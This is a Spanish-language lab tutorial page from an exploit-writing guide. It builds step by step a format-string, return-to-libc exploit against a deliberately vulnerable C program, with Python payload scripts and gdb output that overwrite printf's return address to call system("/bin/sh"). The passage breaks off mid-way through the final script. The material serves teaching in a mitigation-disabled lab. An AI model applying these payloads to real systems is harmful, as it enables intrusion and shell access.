<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> BY-NC-SA | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="ataque-return-to-libc">Ataque return to libc</h1>

<p>La creación de exploits en un escenario en el que no se admite ejecución de código en la pila.</p>

<h2 id="análisis-del-programa-vulnerable">Análisis del programa vulnerable</h2>
<h3 id="e-1">E 1</h3>
<pre><code class="language-C">/* e1.c                                         *
* specially crafted to feed your brain by gera */
/* jumpy vfprintf, Batman! */

int main(int argv,char **argc) {
        /* Can you do it changing the stack?  */
        /* Can you do it without changing it? */
        printf(argc[1]);
        while(1);
}
</code></pre>

<h3 id="qué-hace-el-programa">¿Qué hace el programa?</h3>
<p>El programa imprime el input del usuario y se mantiene en un loop infinito sin finalizar.</p>

<h3 id="cuál-es-la-dificultad-principal">¿Cuál es la dificultad principal?</h3>
<ul>
  <li>Existe un <code>while(1)</code> que provoca un bucle infinito que vuelve inútil sobreescribir la dirección de retorno del <code>main()</code>.</li>
  <li>En este nivel se propone habilitar la <a href="/guia-escritura-exploits/configuracion.md#deshabilitar-mitigacion-wx">mitigación W^X</a>, por lo que se asumirá que el programa se compila sin el flag <code>-z execstack</code> y por ende que no es posible ejecutar nuestro propio shellcode almacenado en la pila. Eso nos obliga a cambiar la estrategia de ataque.</li>
</ul>

<p>Entonces a partir de ahora la compilación del binario se realiza de esta manera:</p>
<pre><code class="language-bash">  user@abos:~$ gcc -m32 -fno-stack-protector -ggdb -mpreferred-stack-boundary=2 -o e1 e1.c
</code></pre>

<h2 id="ataque-return-to-libc-1">Ataque return to libc</h2>
<p>Se observa un uso vulnerable de <code>printf()</code> bajo la forma: <code>printf (argv[1])</code>. Es posible ingresar un input que incluya especificadores de formato como por ejemplo <code>%x%x</code> (para conocer direcciones de la pila) o <code>%n</code> (para escribir en la pila).</p>

<p>Se puede aprovechar la vulnerabilidad de este programa de varias maneras. En este caso se va a seguir una estrategia de ataque del tipo <strong>return-to-libc</strong>.</p>

<p>El objetivo será sobreescribir la dirección de retorno de <code>printf()</code> para que en vez de retornar a <code>main()</code>, se ejecute la función <code>system()</code> dentro de <code>libc</code>. Previamente se adecúa la pila para simular un llamado válido a <code>system()</code> con el argumento <code>/bin/sh</code>, que nos dará una shell.</p>

<p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/pila-ret2libc.png" alt="ret2libc" /></p>

<p>El exploit cuenta con tres partes:</p>

<p><strong>Primera parte</strong>: usamos <code>gdb</code> para conocer tres direcciones en el mapa de memoria del proceso: la dirección de retorno de <code>printf()</code>, la dirección de <code>system()</code> en <code>libc</code> y la dirección del string <code>/bin/sh</code>.</p>

<p><strong>Segunda parte</strong>: sobreescribimos la dirección de retorno de <code>printf()</code> en principio con un número arbitrario.</p>

<p><strong>Tercera parte</strong>: escribimos en esa dirección de retorno exactamente la dirección de <code>system()</code>.</p>

<p><strong>Cuarta parte</strong>: ubicamos el string <code>/bin/sh</code> en el lugar indicado en la pila para que <code>system()</code> lo considere como su argumento y lograr el llamado a <code>system("/bin/sh")</code>.</p>

<p>…………………………………………………………………………………………………………………………………………………</p>

<p><strong>Primera parte</strong>: averiguamos con <code>gdb</code> las direcciones necesarias.   <br />
Creamos un archivo <code>exploit.py</code> con un input de prueba, cuidando mantener el mismo padding durante toda la resolución del problema para controlar las direcciones de la pila.</p>
<pre><code class="language-python">   #! /usr/bin/env python 

   import sys
   from struct import pack

   #padding para controlar las direcciones de la pila
   def pad(s):
        return (s + "A"*100000)[:100000]

   exploit  = "BBBB"

   sys.stdout.write(pad(exploit))
</code></pre>

<ol>
  <li>Averiguamos la dirección de retorno de <code>printf()</code>:
    <pre><code class="language-bash">user@abos:~$ gdb e1
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
Reading symbols from e1...done.
(gdb) r "$(./exploit.py)"
(gdb) si
0x080482d0 in printf@plt ()       ; primera instrucción de printf()
(gdb) x/wx $esp
0xbffe70c0 : 0x0804840c           ; dirección de retorno a main apilada
</code></pre>

    <p>En <code>gdb</code> avanzamos instrucción a instrucción con el comando siguiente instrucción (<code>"si"</code>) hasta entrar en el ` call printf<code>. Exactamente en la primera instrucción dentro de </code>printf` consultamos el tope de la pila para conocer qué dirección de retorno se apiló antes de saltar a la función.</p>

    <p><strong>La dirección de retorno de <code>printf()</code> es <code>0xbffe70c0</code>.</strong></p>
  </li>
  <li>
    <p>Averiguamos la dirección de <code>system()</code> en <code>libc</code>:</p>

    <p>En <code>gdb</code> imprimimos la dirección de la siguiente manera:</p>
    <pre><code class="language-bash">user@abos:~$ gdb e1
GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
Reading symbols from e1...done.
(gdb) break main
(gdb) r "$(./exploit.py)"
(gdb) p system                    ; consultamos la dirección de system en libc
$1 = {&lt;text variable, no debug info&gt;} 0xb7e633e0 &lt;__libc_system&gt;
</code></pre>

    <p><strong>La dirección de <code>system()</code> en <code>libc</code> es <code>0xb7e633e0</code>.</strong></p>

    <p>Recordemos que podemos utilizar esta dirección dado que la misma no cambia en cada ejecución del programa porque hemos deshabilitado la mitigación ASLR con la configuración:</p>
    <pre><code class="language-bash">   user@abos:~$ sudo sysctl -w kernel.randomize_va_space=0
   kernel.randomize_va_space=0
</code></pre>
  </li>
  <li>Averiguamos la dirección del string <code>/bin/sh</code>:    <br />
Si bien se suele almacenar <code>"/bin/sh"</code> dentro de una variable de entorno, también es posible encontrar ese string dentro de <code>libc</code>. Averiguamos su dirección de la siguiente manera:
    <pre><code class="language-bash">       user@abos:~$ gdb e1
          
       (gdb) info proc map                          ; consultamos addr libc
       process 840
       Mapped address spaces:  
         Start Addr   End Addr       Size     Offset objfile
         .... 
+----    0xb7e25000 0xb7fcc000   0x1a7000        0x0 /lib/i386-linux-gnu/i686/cmov/libc-2.19.so 
|    
|        
+---&gt;  (gdb) find 0xb7e25000, +9999999, "/bin/sh"   ; buscamos desde 0xb7e25000 la dirección de libc 
       0xb7f84551                                   ; encontró una coincidencia
       warning: Unable to access 16000 bytes of target memory at 0xb7fce8d9, halting search.
       1 pattern found.

       (gdb) x/s 0xb7f84551                         ; verificamos dirección del string /bin/sh
       0xb7f84551:	"/bin/sh"
</code></pre>

    <p><strong>La dirección de <code>/bin/sh</code> es entonces <code>0xb7f84551</code>.</strong></p>
  </li>
</ol>

<p><strong>Segunda parte</strong>: queremos sobreescribir la dirección de retorno de <code>printf()</code>, en principio con un número arbitrario. Aprovechamos la vulnerabilidad del format string para sobreescribir ese valor en la pila.</p>

<ol>
  <li>
    <p>Identificamos el parámetro  <code>%08x</code> que imprime el format string.  <br />
Construimos un string como input para <code>printf()</code> que imprima el contenido de la pila concatenando varios <code>%08x</code>, y que comience con un patron identificable (<code>0x42424242...</code>).</p>

    <p>El objetivo de este paso intermedio es saber cuál de los parametros <code>%08x</code> imprime el comienzo de nuestro string <code>0x42424242</code>. Una vez detectado ese parámetro lo reemplazamos por <code>%n</code>, parámetro que no imprime sino que <strong>escribe</strong> la cantidad de bytes procesados <strong>en</strong> la dirección dada por el comienzo del string (inicialmente <code>0x42424242</code>).</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/parametro.png" alt="gdb" /></p>

    <p>Para ello adecuamos el script:</p>
    <pre><code class="language-python"> #! /usr/bin/env python
 """Uso: ./e1 "$(./exploit.py)" """    

 import sys
 from struct import pack

 #padding para controlar las direcciones de la pila
 def pad(s):
      return (s + "A"*100000)[:100000]

 exploit  = "BBBBBBBBBBBBBBBBBBBBBBBBBBB"
 exploit += "BBBBBBBBBBBBBBBBBBBBBBBBBBB"
 exploit += "BBBBBBBBBBBBBBBBBBBBBBBBBBB"
 exploit += "%08x.%08x.%08x.%08x." * 200    ; imprimimos contenido de la pila

 sys.stdout.write(pad(exploit))
</code></pre>

    <p>En <code>gdb</code> vemos la impresión de valores de la pila por los sucesivos <code>%08x.%08x.%08x.%08x...</code> hasta identificar el comienzo del string.</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/img2.png" alt="gdb" /></p>

    <p>Identificamos cual de los parámetros imprime el comienzo del string. Para eso vamos quitando <code>%08x</code> hasta imprimir sólo el comienzo del string y observar que inmediatamente lo siguen las <code>"AAAA..."</code> del padding.  <br />
   En este caso con prueba y error detectamos que el parámetro número 116 imprime el <code>0x42424242</code> inicial. En la imagen a continuación se ve cómo lo siguen las “AAAA…” del padding que incluimos.</p>

    <pre><code class="language-python">   #! /usr/bin/env python
   """Uso: ./e1 "$(./exploit.py)" """    

   import sys
   from struct import pack

   #padding para controlar las direcciones de la pila
   def pad(s):
        return (s + "A"*100000)[:100000]

   exploit  = "B"           # alineacion
   exploit += "BBBB"        # comienzo del string
   exploit += "%08x." * 116

   sys.stdout.write(pad(exploit))
</code></pre>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/img3.png" alt="gdb" /></p>
  </li>
  <li>
    <p>Reemplazamos el principio del string <code>0x42424242</code> por la dirección de retorno de <code>printf</code> alineada adecuadamente. 
<img src="/guia-escritura-exploits/esoteric/imagenes/e1/parametro2.png" alt="gdb" /></p>

    <p>El archivo <code>exploit.py</code> resultante es:</p>
    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./e1 "$(./exploit.py)" """
   
import sys
from struct import pack
   
def pad(s):
     return (s + "A"*100000)[:100000]
   
ret_addr  = 0xbffe70c0
   
exploit  = "B"                      # alineacion
exploit += pack("&lt;I", ret_addr)     # ret_addr_after_printf 
exploit += "BBBB"
exploit += "%08x." * 116
   
sys.stdout.write(pad(exploit))
</code></pre>

    <p>Y vemos que el parámetro <code>%08x</code> número 116 imprime esa dirección en el output resultante:</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/img4.png" alt="gdb" /></p>
  </li>
  <li>
    <p>Si reemplazamos el último <code>%x</code> por <code>%n</code> vemos como escribimos <strong>en</strong> la dirección de retorno de <code>printf</code> el número de caracteres procesados hasta el momento.</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/parametro3.png" alt="pila" /></p>

    <p>Para ello adecuamos el exploit:</p>

    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./e1 "$(./exploit.py)" """
   
import sys
from struct import pack
   
def pad(s):
     return (s + "A"*100000)[:100000]
   
ret_addr  = 0xbffe70c0
   
exploit  = "B"                      # alineacion
exploit += pack("&lt;I", ret_addr)     # ret_addr_after_printf 
exploit += "BBBB"
exploit += "%08x." * 115
exploit += "%n"                     # escribimos caract. procesados
sys.stdout.write(pad(exploit))
</code></pre>

    <p>Al ejecutar, como <code>%n</code> siempre escribe la cantidad de caracteres procesados en la dirección dada, vemos que escribimos <code>0x414</code> en la dirección de retorno de <code>printf</code>.</p>
    <pre><code class="language-bash">(gdb) r "$(./exploit.py)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Program received signal SIGSEGV, Segmentation fault.
0x00000414 in ?? ()                         ; logramos un salto en la ejecución
Cannot write the dashboard 
Traceback (most recent call last):
  File "&lt;string&gt;", line 358, in render
  File "&lt;string&gt;", line 939, in lines
MemoryError: Cannot access memory at address 0x414
(gdb) x/wx 0xbffe70c0                                                                   
0xbffe70c0: 0x00000414                      ; logramos esta escritura!
</code></pre>
    <p>Como en la dirección de retorno se almacena el valor <code>0x00000414</code>, al finalizar el llamado a <code>printf()</code> se intenta retornar a esa dirección provocando una violación de segmento.    <br />
Logramos cumplir el objetivo intermedio: nos aprovechamos del format string para sobreescribir la dirección de retorno del <code>printf</code> y controlar el flujo de ejecución del programa. En este punto sobreescribirmos la dirección de retorno con el número <code>0x414</code> (la cantidad de bytes del string procesados hasta el <code>%n</code>). Todavía es necesario escribir exactamente la dirección de <code>system()</code> para que sea esa la función que se ejecute.</p>
  </li>
  <li>
    <p>Usaremos como recurso el padding de los parámetros de formato para controlar la cantidad de caracteres que procesa <code>%n</code>. En el especificador previo al <code>%n</code> agregamos un padding <code>%100x</code> para ver la cantidad de caracteres procesados que se escriben.   <br />
El objetivo será reemplazar la dirección de retorno de <code>printf()</code> por <code>system()</code>, es decir, debemos lograr que la cantidad de caracteres procesados coincida con la dirección de <code>system()</code> tal como se muestra en la imagen a continuación.</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/parametro4.png" alt="pila" /></p>

    <p>Modificamos el script:</p>

    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./e1 "$(./exploit.py)" """
   
import sys
from struct import pack
   
def pad(s):
     return (s + "A"*100000)[:100000]
   
ret_addr  = 0xbffe70c0
   
exploit  = "B"                      # alineacion
exploit += pack("&lt;I", ret_addr)     # ret_addr_after_printf 
exploit += "BBBB"
exploit += "%08x." * 114
exploit += "%100x"                  # modificamos cant. caract. procesados
exploit += "%n"                     # escribimos en ret_addr_after_printf
   
sys.stdout.write(pad(exploit))
</code></pre>
    <p>Y lo ejecutamos:</p>
    <pre><code class="language-bash">(gdb) r "$(./exploit.py)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Program received signal SIGSEGV, Segmentation fault.
0x0000046f in ?? ()
Cannot write the dashboard
Traceback (most recent call last):
  File "&lt;string&gt;", line 358, in render
  File "&lt;string&gt;", line 939, in lines
MemoryError: Cannot access memory at address 0x46f
(gdb) x/wx 0xbffe70c0                                                                   
0xbffe70c0: 0x0000046f
</code></pre>

    <p>Ahora en la dirección de retorno se almacena el valor <code>0x0000046f</code>, al finalizar el llamado a <code>printf()</code> se intenta retornar a esa dirección provocando también una violación de segmento. Entonces sabemos que la cantidad de caracteres procesados incluido el padding de <code>"%100x"</code> es <code>0x46f</code>.</p>
  </li>
</ol>

<p><strong>Tercera parte</strong>: no queremos escribir cualquier número en <code>ret_addr</code> sino exactamente la dirección de <code>system()</code>.   <br />
Escribir con <code>%n</code> la dirección de <code>system</code> implicaría procesar una cantidad de bytes enormes, para evitarlo escribiremos la dirección de <code>system</code> de a un byte a la vez con el parámetro <code>%hhn</code>.</p>

<ol>
  <li>
    <p>Con cuatro parámetros <code>%hhn</code> sobreescribimos de a un byte a la vez la nueva dirección de retorno.    <br />
Recordemos que la dirección de retorno de <code>printf</code> se encuentra en <code>0xbffe70c0</code> y la dirección de <code>system</code> es <code>0xb7e633e0</code>. El objetivo será modificar byte por byte esta dirección de retorno de la siguiente manera:</p>

    <pre><code class="language-asm">Valor de `ret_addr_after_printf`

# byte | ret_addr    | valor actual  | valor deseado (system_addr) 
   0     0xbffe70c0:       0x0c     --&gt;      0xe0
   1     0xbffe70c1:       0x84     --&gt;      0x33
   2     0xbffe70c2:       0x04     --&gt;      0xe6 
   3     0xbffe70c2:       0x08     --&gt;      0xb7
                      ---------------  ----------------  
                         0x0804840c       0xb7e633e0
</code></pre>

    <p>Entonces en el exploit desglosamos la dirección de retorno en cada uno de sus bytes. Y por cada byte, vamos a incluir una dupla <code>"%&lt;padding&gt;x + %hhn"</code> para escribir una parte de la dirección de <code>system</code> en cada uno de ellos. Por ejemplo, para el primer byte menos significativo de la dirección de retorno incluimos las siguientes líneas en el script:</p>
    <pre><code class="language-python">#Dupla para 1er byte de ret_addr
exploit += "%100x"                       #cant. bytes procesados: ???
exploit += "%hhn"                        #escribe ret_addr_byte_0
</code></pre>
    <p>El layout de la pila deseado será algo similar a:</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/parametro5.png" alt="pila" /></p>

    <p>El exploit queda construido de la siguiente manera:</p>
    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./e1 "$(./exploit.py)" """
   
import sys
from struct import pack
   
def pad(s):
        return (s + "A"*100000)[:100000]
   
ret_addr     = 0xbffe70c0
#system_addr = 0xb7e633e0
   
ret_addr_byte_0 = ret_addr              # low byte: 0x0c
ret_addr_byte_1 = ret_addr + 1          # 2nd byte: 0x84
ret_addr_byte_2 = ret_addr + 2          # 3rd byte: 0x04
ret_addr_byte_3 = ret_addr + 3          #high byte: 0x08
   
exploit  = "A"
exploit += pack("&lt;I", ret_addr_byte_0)  #%hhn
exploit += "BBBB"                       #lo imprime %100x
exploit += pack("&lt;I", ret_addr_byte_1)  #%hhn
exploit += "CCCC"
exploit += pack("&lt;I", ret_addr_byte_2)  #%hhn
exploit += "DDDD"
exploit += pack("&lt;I", ret_addr_byte_3)  #%hhn
exploit += "EEEE"
   
exploit += "%08x." * 114
   
#low_byte
exploit += "%100x"                       #cant. bytes procesados: 0x46f
exploit += "%hhn"                        #escribe ret_addr_byte_0
   
sys.stdout.write(pad(exploit))
</code></pre>

    <p>El primer especificador <code>%100x</code> nos va a permitir -cambiando su padding- modificar el número que escribimos en el byte menos significativo de la dirección de retorno.</p>

    <p>Observamos el valor que obtenemos con ese padding arbitrario de <code>100</code>, poniendo un breakpoint en la instrucción <code>ret</code> dentro de <code>printf</code> y viendo el nuevo valor almacenado:</p>
    <pre><code class="language-bash"> (gdb) r "$(./exploit.py)"
 (gdb) si
 0x080482d0 in printf@plt ()
 (gdb) x/10i $eip
          0xb7e71c63 &lt;__printf+19&gt;:  mov    DWORD PTR [esp+0x8],eax
          0xb7e71c67 &lt;__printf+23&gt;:  mov    eax,DWORD PTR [esp+0x20]
          0xb7e71c6b &lt;__printf+27&gt;:  mov    DWORD PTR [esp+0x4],eax
          0xb7e71c6f &lt;__printf+31&gt;:  mov    eax,DWORD PTR [ebx-0x70]
          0xb7e71c75 &lt;__printf+37&gt;:  mov    eax,DWORD PTR [eax]
          0xb7e71c77 &lt;__printf+39&gt;:  mov    DWORD PTR [esp],eax
          0xb7e71c7a &lt;__printf+42&gt;:  call   0xb7e68290 &lt;_IO_vfprintf_internal&gt;
          0xb7e71c7f &lt;__printf+47&gt;:  add    esp,0x18
          0xb7e71c82 &lt;__printf+50&gt;:  pop    ebx
 break =&gt; 0xb7e71c83 &lt;__printf+51&gt;:  ret                        ; detenemos antes de que printf retorne
 (gdb) break *0xb7e71c83		
 (gdb) r "$(./exploit.py)"
</code></pre>

    <p>Y al llegar al breakpoint, inspeccionamos la pila y observamos el nuevo valor del byte menos significativo de la dirección de retorno :</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/5-gdb.png" alt="gdb" /></p>

    <p>Vemos como el valor pasa de ser: <code>0xbffe70c0:	0x0804840c</code>, a ser: <code>0xbffe70c0:	0x08048487</code>.</p>

    <p>Entonces sabemos que con un padding -arbitrario- de <code>100</code> escribimos en el byte menos significativo de <code>ret_addr</code> el número <code>0x87</code> o 135 en decimal.</p>
  </li>
  <li>
    <p>Realizamos cálculos para lograr el número deseado (recordando que la dirección de <code>system()</code> es <code>0xb7e633e0</code>). En este caso debemos escribir <code>0xe0</code> o 224 en decimal, que corresponde al byte menos significativo de la dirección de <code>system()</code>.</p>

    <p>Para los cálculos es de utilidad la fórmula:</p>
    <pre><code class="language-python">#Fórmula para el cálculo del padding
nro deseado - nro obtenido + padding_anterior = padding_nuevo
</code></pre>
    <p>En este caso:</p>
    <pre><code class="language-python">   #low_byte
   (nro deseado  - nro obtenido) + padding_anterior = padding_nuevo
   (0xe0 - 0x87) + 100 = ???
   (224 - 135)   + 100 = 189    ; 189 este es el padding necesario para lograr 0xe0
</code></pre>

    <p>Siguiendo la fórmula, reemplazamos en <code>exploit.py</code> el padding anterior de <code>100</code> por el nuevo padding <code>189</code> y obtenemos el resultado deseado en el byte menos significativo de la dirección de retorno:</p>
    <pre><code class="language-python">   #low_byte
   exploit += "%189x"                      #cant. bytes procesados: 0xe0
   exploit += "%hhn"                       #escribe ret_addr_byte_0
</code></pre>
    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/6-gdb.png" alt="gdb" /></p>
  </li>
  <li>
    <p>Realizamos el mismo proceso para para el resto de los bytes. Primero con un padding arbitrario vemos qué número escribimos en el byte correspondiente de la dirección de retorno. Y luego siguiendo la fórmula modificamos el padding para hacer una escritura con el número adecuado.
Hasta finalmente sobreescribir correctamente los cuatro bytes de la dirección de retorno de <code>printf()</code> para que al retornar salte a <code>system()</code> y no a <code>main()</code>.</p>

    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./e1 "$(./exploit.py)" """
    
import sys
from struct import pack
    
def pad(s):
        return (s + "A"*100000)[:100000]
    
ret_addr     = 0xbffe70c0
#system_addr = 0xb7e633e0
    
ret_addr_byte_0 = ret_addr              # low byte: 0x0c
ret_addr_byte_1 = ret_addr + 1          # 2nd byte: 0x84
ret_addr_byte_2 = ret_addr + 2          # 3rd byte: 0x04
ret_addr_byte_3 = ret_addr + 3          #high byte: 0x08
    
exploit  = "A"
exploit += pack("&lt;I", ret_addr_byte_0)  #%hhn
exploit += "BBBB"                       
exploit += pack("&lt;I", ret_addr_byte_1)  #%hhn
exploit += "CCCC"
exploit += pack("&lt;I", ret_addr_byte_2)  #%hhn
exploit += "DDDD"
exploit += pack("&lt;I", ret_addr_byte_3)  #%hhn
exploit += "EEEE"
    
exploit += "%08x." * 114
    
#low_byte
exploit += "%189x"                      #cant. bytes procesados: 0xe0
exploit += "%hhn"                       #escribe ret_addr_byte_0
     
#2do_byte
exploit += "%83x"                       #cant. bytes: 0x33
exploit += "%hhn"                       #ret_addr_byte_1
    
#3er_byte
exploit += "%179x"                      #cant. bytes: 0xe6 
exploit += "%hhn"                       #ret_addr_byte_2
        
#high_byte
exploit += "%209x"                      #cant. bytes: 0xb7
exploit += "%hhn"                       #ret_addr_byte_3
        
sys.stdout.write(pad(exploit))
</code></pre>

    <blockquote>
      <p><strong>Consideraciones</strong>:</p>
    </blockquote>

    <blockquote>
      <p>Si por el cálculo obtenemos un número negativo como padding, incluimos un 1 delante del número deseado (como descartamos el carry logramos el cometido). Por ejemplo, en el segundo byte de la dirección de retorno queremos escribir <code>0x33</code> pero los cálculos nos devuelven un padding negativo, para calcularlo usamos entonces el número <code>0x133</code> en vez de <code>0x33</code> y descartamos el carry.</p>
    </blockquote>

    <blockquote>
      <pre><code class="language-python">#Fórmula para el cálculo del padding       
&gt;
#2do_byte
exploit += "%08x"                       #cant. bytes procesados deseados: 0xe8
exploit += "%hhn"                       #escribe ret_addr_byte_1
</code></pre>
      <p>Probamos con un padding de <code>08</code> y procesamos una cantidad de bytes <code>0xe8</code>.
<img src="/guia-escritura-exploits/esoteric/imagenes/e1/7-gdb.png" alt="gdb" /></p>

      <pre><code class="language-python">#Fórmula para el cálculo del padding

#versión 1: 2do_byte
(nro deseado - nro obtenido) + padding_anterior = padding_nuevo
(0x33 - 0xe8) + 8 = ??? NEGATIVO

#version correcta: 2do_byte
(nro deseado - nro obtenido) + padding_anterior = padding_nuevo
(0x133 - 0xe8) + 8 = ???       ; reemplazamos 0x33 por 0x133
(307 - 232) + 8 = 83           ; logramos calcular el padding
</code></pre>

      <p>Y con un padding de <code>83</code> obtenemos el resultado deseado:</p>
      <pre><code class="language-python">#2do_byte
exploit += "%83x"                       #cant. bytes procesados deseados: 0x33
exploit += "%hhn"                       #escribe ret_addr_byte_1
</code></pre>
    </blockquote>

    <p>Finalmente, logramos sobreescribir correctamente los cuatro bytes de la dirección de retorno con el valor de <code>system</code> en <code>libc</code> (<code>0xb7e633e0</code>):</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/8-gdb.png" alt="gdb" /></p>

    <p>Y logramos un salto a <code>system()</code>:</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/9-gdb.png" alt="gdb" /></p>

    <p>El layout de la pila resultante es el siguiente:</p>

    <p><img src="/guia-escritura-exploits/esoteric/imagenes/e1/parametro6.png" alt="pila" /></p>
  </li>
</ol>

<p><strong>Cuarta parte</strong>: para que el llamado a <code>system()</code> nos devuelva una shell, esta función debe tener como argumento el string <code>/bin/sh</code>.</p>

<p>Dado que el llamado a <code>system()</code> no se hizo con una instrucción <code>call</code> sino que se logró modificando una dirección de retorno de otra función, es necesario cumplir con la expectativa de <code>system()</code> en relación a la pila. Siguiendo la convención del llamado a funciones, <code>system()</code> espera en el tope de la pila una dirección de retorno (<code>ret_addr_after_sys</code>) y antes su argumento.    <br />
Ese estado de la pila es el que hay que construir a mano, para ubicar el string <code>/bin/sh</code> en el lugar indicado y cuando la ejecución salte a <code>system()</code> esta función identifique a ese string como su argumento.</p>

<p><img src="/guia-escritura-exploits/esoteric/imagenes/llamado-sys.png" alt="gdb" /></p>

<blockquote>
  <p><strong>Consideraciones</strong>:   <br />
La dirección de retorno <code>ret_addr_after_sys</code> no nos interesa en este momento (únicamente la tenemos en cuenta para saltearla). No obstante, si se controlan las sucesivas direcciones de retorno es posible encadenar varias llamadas a funciones o incluso otro tipo de <code>gadgets</code>, de ahí el nombre de <code>return-oriented programming</code>.</p>
</blockquote>

<ol>
  <li>
    <p>Seguimos el mismo procedimiento pero esta vez para almacenar la dirección de <code>/bin/sh</code> (antes vimos que era <code>0xb7f84551</code>) en la posición exacta en la pila dónde <code>system()</code> buscará su argumento (<code>ret_addr + 8 = 0xbffe70c8</code>).</p>

    <p>Y finalmente el exploit resultante es:</p>

    <pre><code class="language-python">#! /usr/bin/env python
"""Uso: ./e1 "$(./exploit.py)" """
    
import sys
from struct import pack
    
def pad(s):
        return (s + "A"*100000)[:100000]
    
ret_addr     = 0xbffe70c0
arg_sys_addr = ret_addr + 8                     #0xbffe70c8
    
#system_addr = 0xb7e633e0
#bin_sh_addr = 0xb7f84551
    
ret_addr_byte_0 = ret_addr                      #low byte
ret_addr_byte_1 = ret_addr + 1
ret_addr_byte_2 = ret_addr + 2
ret_addr_byte_3 = ret_addr + 3                  #high byte
    
